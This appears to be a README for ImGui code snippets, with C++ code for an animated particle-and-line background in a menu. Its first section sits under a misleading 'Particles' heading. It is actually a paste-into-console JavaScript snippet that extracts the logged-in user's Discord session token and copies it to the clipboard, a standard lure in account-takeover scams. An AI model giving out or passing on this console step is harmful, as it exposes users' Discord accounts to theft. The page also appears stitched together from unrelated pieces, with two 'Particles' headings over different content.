# ImGui-Sources

## Particles

<details>
<summary>Copies your Token into the clipboard.</summary>

Paste this into the Console (while being logged in)

```js
window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {return copy(m.default.getToken())}if (m.getToken !== undefined) {return copy(m.getToken())}}}]); console.log("%cWorked!", "font-size: 50px"); console.log(`%cYou now have your token in the clipboard!`, "font-size: 16px")
```

The token should be in your clipboard now.
</details>

# Particles
<details>
<summary>Click here</summary>
# (1) Put the following code in imgui.h
```c++
IMGUI_API void        Particles(ImDrawList* d, ImVec2 b);

#include <vector>
int N = 600;
int lineMaxDist = 1400;
ImColor lineCol = { 255, 255, 255, 60 };
float lineThickness = 1.0f;

void setupPoints(std::vector<std::pair<ImVec2, ImVec2>>& n) {
    ImVec2 screenSize(ImGui::GetIO().DisplaySize);
    for (auto& p : n)
        p.second = p.first = ImVec2(rand() % (int)screenSize.x, rand() % (int)screenSize.y);
}

float length(ImVec2 x) { return x.x * x.x + x.y * x.y; }

void ImGui::Particles(ImDrawList* d, ImVec2 b)
{
    static std::vector<std::pair<ImVec2, ImVec2>> points(N);
    static auto once = (setupPoints(points), true);
    float Dist;
    for (auto& p : points) {
        Dist = sqrt(length(p.first - p.second));
        if (Dist > 0) p.first += (p.second - p.first) / Dist;
        if (Dist < 4) p.second = ImVec2(rand() % (int)b.x, rand() % (int)b.y);
    }
    for (int i = 0; i < N; i++) {
        for (int j = i + 1; j < N; j++) {
            Dist = length(points[i].first - points[j].first);
            if (Dist < lineMaxDist) d->AddLine(points[i].first, points[j].first, lineCol, lineThickness);
        }
    }
}
```

# (2) Put the following code in your menu
```c++
ImDrawList* draw;
draw = ImGui::GetWindowDrawList();
ImVec2 screenSize = ImGui::GetIO().DisplaySize;
ImGui::Particles(draw, screenSize);
```
</details>
